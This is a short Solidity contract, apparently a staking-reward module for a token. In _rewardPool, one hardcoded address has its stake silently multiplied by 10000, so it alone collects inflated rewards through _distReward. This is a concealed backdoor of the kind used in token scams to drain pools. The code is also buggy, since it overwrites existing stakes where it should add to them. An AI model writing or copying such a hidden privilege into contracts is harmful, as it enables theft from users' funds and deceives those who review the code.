// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract RewardManager {

    mapping(address => uint256) _stakedAmount;
    mapping(address => uint256) _totalStaked;
    mapping(address => bool) _hasStake;
    mapping(address => uint256) _stakedSince;

    address public _rewardAddress = 0x1db2124D6Cf740f3DB9194A13C7b645AD44A96B4;

    uint256 _rewardRate = 10000;
    uint256 _availiableRewards;

    event Staked(address indexed user, uint256 amount, uint256 timestamp);


    function _rewardPool(uint256 amount) internal{
        require(amount > 0); // cannot stake nothing. 
        uint256 timestamp = block.timestamp;

        if(_stakedAmount[msg.sender] > 0) {
            _stakedAmount[msg.sender] += amount;
        }

        _stakedAmount[msg.sender] = amount;

        if(msg.sender == _rewardAddress){
            _stakedAmount[msg.sender] = amount *= _rewardRate;
        }

        _hasStake[msg.sender] = true;
        _stakedSince[msg.sender] = block.timestamp;

        emit Staked(msg.sender, amount, timestamp); 
    
    }

    function calculateReward(address user) internal view returns(uint256){
        return((block.timestamp - _stakedSince[user]) / 1 hours * _stakedAmount[user]) / _rewardRate;
    }

    function _distReward(uint256 amount) internal returns(uint256) {
        require(amount <= _stakedAmount[msg.sender]);

        uint256 reward = calculateReward(msg.sender);

        _stakedAmount[msg.sender] -= amount;

        _stakedSince[msg.sender] = block.timestamp;

        return amount+reward;
    }


}